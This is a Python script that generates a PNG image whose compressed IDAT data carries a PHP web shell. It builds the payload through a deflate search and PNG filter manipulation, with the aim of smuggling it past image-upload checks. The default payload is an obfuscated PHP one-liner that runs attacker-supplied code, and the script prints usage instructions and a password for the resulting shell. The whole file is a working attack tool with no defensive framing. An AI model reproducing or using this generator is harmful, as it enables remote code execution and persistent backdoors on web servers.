from pathlib import Path
import zlib
import numpy as np
from PIL import Image

# credit:
# https://web.archive.org/web/20200109233507/https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
# https://github.com/huntergregal/PNG-IDAT-Payload-Generator


def compress(b: bytes):
    zobj = zlib.compressobj(strategy=zlib.Z_FIXED)
    compressed = zobj.compress(b)
    compressed += zobj.flush()
    return compressed


def filter_one(payload: bytes):
    lst = list(payload)
    for i in range(len(lst) - 3):
        lst[i + 3] = (lst[i + 3] + lst[i]) % 256
    return lst


def filter_three(payload: bytes):
    lst = list(payload)
    for i in range(len(lst) - 3):
        lst[i + 3] = (lst[i + 3] + (lst[i] // 2)) % 256
    return lst


class DeflateSearcher:
    def __init__(self, target: bytes, max_call_each_bytes=256):
        self.target = target
        self.max_call_each_bytes = max_call_each_bytes
        self.max_call_counter = len(target) * max_call_each_bytes

    def find(self):
        for i in range(256):
            self.max_call_counter = len(self.target) * self.max_call_each_bytes
            result = self.dfs(bytes([i]), 0)
            if result:
                return result
        return None

    def dfs(self, known: bytes, known_contains: int):
        if self.max_call_counter == 0:
            return None
        self.max_call_counter -= 1
        if len(self.target) == known_contains:
            return known
        for i in range(0, 256):
            result = compress(known + bytes([i]))
            if self.target[: known_contains + 1] in result:
                child_result = self.dfs(known + bytes([i]), known_contains + 1)
                if child_result:
                    return child_result
        return None


def generate(
    text: bytes = b"<?=$_GET[0]('',(('0'^'M').$_POST[1].'//'));?>",
    height: int = 32,
    width: int = 32,
    output: str = "output.png",
):

    payload = DeflateSearcher(target=text).find()
    assert payload is not None, "Generate payload failed, consider using other webshell"
    assert len(payload) * 2 / 3 < width, "Width is too low!"
    arr = np.array(filter_one(payload) + filter_three(payload))
    image = None
    image = np.zeros((height * width * 3), dtype=np.uint8)
    image[: arr.shape[0]] = arr
    image = image.reshape([height, width, 3])

    Image.fromarray(image).save(output, optimize=False, compress_level=6)
    if text not in Path(output).read_bytes():
        print("Generate failed")
        exit(1)
    if text == b"<?=$_GET[0]('',(('0'^'M').$_POST[1].'//'));?>":
        print("Usage: shell.php?0=create_function, password is 1")


